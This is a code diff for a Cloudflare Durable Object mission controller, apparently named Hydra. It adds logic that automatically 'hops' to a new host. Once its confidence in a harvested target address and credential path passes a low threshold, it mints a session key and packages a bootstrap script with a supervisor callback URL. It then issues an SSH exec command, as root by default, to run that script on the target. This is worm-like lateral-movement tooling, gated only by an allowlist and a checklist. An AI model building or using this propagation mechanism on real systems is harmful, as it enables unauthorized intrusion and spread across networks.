@@ -5,12 +5,23 @@ import { buildInitialQueue, pickAction, ingestObservations } from './engine/tick
 import { advancePhase } from './engine/phases';
 import { extractObservations } from './engine/extract';
 import { ALL_PROBES } from './catalog/registry';
+import { confidenceToAttemptHop } from './engine/confidence';
+import { topCandidate } from './engine/beliefs';
+import { distillWarmPacket } from './hop/distill';
+import { enforcePreHopChecklist } from './hop/checklist';
+import { composeBootstrapBundle } from './hop/bundle';
+import { composeSshHopExec } from './hop/ssh';
+import { TARGET_BOOTSTRAP_SH } from './hop/target-script';
 
 const LEGAL: Record<Phase, Phase[]> = {
   registered: ['provisioning', 'verifying', 'failed', 'terminated'],
   provisioning: ['scanning', 'failed', 'terminated'],
-  scanning: ['hypothesizing', 'failed', 'terminated'],
-  hypothesizing: ['planning', 'scanning', 'failed', 'terminated'],
+  // scanning + hypothesizing CAN transition to executing-hop directly when
+  // confidence-to-hop crosses threshold before strict belief convergence
+  // (split credentials, time pressure, etc.). The auto-hop trigger uses
+  // confidenceToAttemptHop() as the real gate; phase is advisory.
+  scanning: ['hypothesizing', 'executing-hop', 'failed', 'terminated'],
+  hypothesizing: ['planning', 'scanning', 'executing-hop', 'failed', 'terminated'],
   planning: ['executing-hop', 'hypothesizing', 'failed', 'terminated'],
   'executing-hop': ['verifying', 'planning', 'failed', 'terminated'],
   verifying: ['completed', 'failed', 'terminated'],
@@ -21,10 +32,12 @@ const LEGAL: Record<Phase, Phase[]> = {
 
 export class MissionDO {
   private state: DurableObjectState;
+  private env: Env;
   private mission: MissionState | null = null;
 
-  constructor(state: DurableObjectState, _env: Env) {
+  constructor(state: DurableObjectState, env: Env) {
     this.state = state;
+    this.env = env;
     this.state.blockConcurrencyWhile(async () => {
       this.mission = (await this.state.storage.get<MissionState>('mission')) ?? null;
     });
@@ -42,6 +55,7 @@ export class MissionDO {
     if (route === 'rehydrate') return this.rehydrate(req);
     if (route === 'extend') return this.extend(req);
     if (route === 'log') return this.log();
+    if (route === 'set-fingerprint') return this.setFingerprint(req);
     return new Response('not found', { status: 404 });
   }
 
@@ -51,6 +65,7 @@ export class MissionDO {
       mission_id?: string; fingerprint: string; platform: 'linux' | 'macos' | 'wsl';
       target_allowlist: string[]; strict_gold: boolean;
       budget_paid_usd: number; deadline_ms: number;
+      target_user?: string; hop_attempt_threshold?: number;
     };
     const id = body.mission_id ?? this.state.id.toString();
     this.mission = {
@@ -68,6 +83,9 @@ export class MissionDO {
       jump_chain: ['origin'],
       target_allowlist: body.target_allowlist,
       executed_probes: [],
+      target_user: body.target_user ?? 'root',
+      hop_attempt_threshold: body.hop_attempt_threshold ?? 0.3,
+      hop_attempted: false,
     };
     await this.state.storage.put('mission', this.mission);
     return Response.json(this.mission);
@@ -98,6 +116,18 @@ export class MissionDO {
     if (this.mission.phase === 'registered') this.mission.phase = 'provisioning';
     else if (this.mission.phase === 'provisioning') this.mission.phase = 'scanning';
 
+    // Auto-trigger attempt_hop when beliefs have converged enough.
+    // Gated by: confidence > threshold, no prior hop, valid top candidates,
+    // pre-hop checklist passes. Decoupled from strict planning-phase entry
+    // because credential posteriors realistically split between competing
+    // keys; the explicit confidence gate is the right measure.
+    const hopDirective = await this.maybeEmitHop();
+    if (hopDirective) {
+      this.mission.tick += 1;
+      await this.state.storage.put('mission', this.mission);
+      return Response.json(hopDirective);
+    }
+
     const q = buildInitialQueue(this.mission);
     const { directive, probeId } = pickAction(this.mission, q);
     if (probeId) {
@@ -111,6 +141,106 @@ export class MissionDO {
     this.mission.tick += 1;
     await this.state.storage.put('mission', this.mission);
     return Response.json(directive);
+  }
+
+  private async maybeEmitHop(): Promise<{ id: string; op: 'exec'; cmd: string; timeout_s: number } | null> {
+    if (!this.mission) return null;
+    if (this.mission.hop_attempted) return null;
+    if (this.mission.phase === 'completed' || this.mission.phase === 'failed' || this.mission.phase === 'terminated') return null;
+
+    const threshold = this.mission.hop_attempt_threshold ?? 0.3;
+    const confidence = confidenceToAttemptHop(this.mission.beliefs);
+    if (confidence < threshold) return null;
+
+    const addr = this.mission.beliefs['h:target-address'];
+    const cred = this.mission.beliefs['h:target-credentials'];
+    const topAddr = addr ? topCandidate(addr) : undefined;
+    const topCred = cred ? topCandidate(cred) : undefined;
+    if (!topAddr || !topCred) return null;
+
+    // Validate target host appears in the operator allowlist (codex §1.1).
+    if (!this.mission.target_allowlist.includes(topAddr.value)) return null;
+
+    // Build warm packet + run pre-hop distillation checklist.
+    const packet = distillWarmPacket(this.mission, {
+      recentTicks: [], catalogIds: ALL_PROBES.map(p => p.id),
+      codexHash: 'sha256:codex-pin-v1',
+    });
+    const check = enforcePreHopChecklist(packet);
+    if (!check.ok) return null;  // hop blocked; mission stays in current phase
+
+    // Provision the target mission server-side: mint id, init DO with
+    // fingerprint='_pending_' (target's actual fingerprint is unknown until
+    // it sends the success proof; handleSuccess records it then), pre-load
+    // beliefs from the warm packet, mint session_key + store in KV.
+    const targetMissionId = `${this.mission.mission_id}-tgt-${crypto.randomUUID().slice(0, 8)}`;
+    const targetStub = this.env.MISSION_DO.get(this.env.MISSION_DO.idFromName(targetMissionId));
+    await targetStub.fetch('https://do/init', {
+      method: 'POST',
+      body: JSON.stringify({
+        mission_id: targetMissionId,
+        fingerprint: '_pending_',  // updated by handleSuccess on first arrival
+        platform: 'linux',
+        target_allowlist: this.mission.target_allowlist,
+        strict_gold: this.mission.strict_gold,
+        budget_paid_usd: this.mission.budget_paid_usd_remaining,
+        deadline_ms: this.mission.wall_clock_deadline_ms,
+        target_user: this.mission.target_user,
+        hop_attempt_threshold: this.mission.hop_attempt_threshold,
+      }),
+    });
+    // Push the warm packet into the target DO so its beliefs / jump_chain are
+    // pre-populated. This sets phase=verifying.
+    await targetStub.fetch('https://do/rehydrate', {
+      method: 'POST',
+      body: JSON.stringify({ packet }),
+    });
+    // Mint a session_key the target script will use to sign /v1/success.
+    const sessionKeyBytes = new Uint8Array(32);
+    crypto.getRandomValues(sessionKeyBytes);
+    const targetSessionKey = [...sessionKeyBytes].map(b => b.toString(16).padStart(2, '0')).join('');
+    await this.env.HYDRA_KV.put(`session:${targetMissionId}`, targetSessionKey, { expirationTtl: 86_400 });
+    // Also index the target mission so /admin/missions sees it.
+    await this.env.HYDRA_KV.put(`mission-index:${targetMissionId}`, JSON.stringify({
+      started_ms: Date.now(),
+      fingerprint_expected: '_pending_',
+      target_allowlist: this.mission.target_allowlist,
+      strict_gold: this.mission.strict_gold,
+      hop_origin: this.mission.mission_id,
+    }), { expirationTtl: 86_400 * 30 });
+
+    // Compose bundle: the actual proof-of-arrival script + target's
+    // mission_id + supervisor URL + session_key + warm packet (target reads
+    // jump_chain_origin from warm_packet).
+    const supervisorUrl = `https://${this.env.SUPERVISOR_HOST ?? 'hydra-prime-supervisor.ajay-34b.workers.dev'}`;
+    const bundleB64 = composeBootstrapBundle({
+      hydra_sh: TARGET_BOOTSTRAP_SH,
+      masked_token_hex: targetSessionKey,  // unused by target script (kept for bundle schema)
+      salt: '',
+      mission_id: targetMissionId,
+      warm_packet: packet,
+      supervisor_url: supervisorUrl,
+      session_key: targetSessionKey,  // target script uses this directly
+    });
+
+    let hopDirective;
+    try {
+      hopDirective = composeSshHopExec({
+        credsPath: topCred.value,
+        targetUser: this.mission.target_user ?? 'root',
+        targetHost: topAddr.value,
+        bundleB64,
+      });
+    } catch (e) {
+      // Sanitization rejected one of the inputs (probably an unsafe character
+      // in the extracted credential path or target host). Don't crash the
+      // mission; just skip the hop and let probes continue.
+      return null;
+    }
+
+    this.mission.hop_attempted = true;
+    if (this.mission.phase !== 'executing-hop') this.mission.phase = 'executing-hop';
+    return hopDirective;
   }
 
   private async rehydrate(req: Request): Promise<Response> {
@@ -196,6 +326,14 @@ export class MissionDO {
     this.mission.budget_paid_usd_remaining += extra_budget_usd;
     await this.state.storage.put('mission', this.mission);
     return Response.json(this.mission);
+  }
+
+  private async setFingerprint(req: Request): Promise<Response> {
+    if (!this.mission) return new Response('not initialized', { status: 404 });
+    const { fingerprint } = await req.json() as { fingerprint: string };
+    this.mission.origin_fingerprint = fingerprint;
+    await this.state.storage.put('mission', this.mission);
+    return Response.json({ ok: true, origin_fingerprint: fingerprint });
   }
 
   private async log(): Promise<Response> {
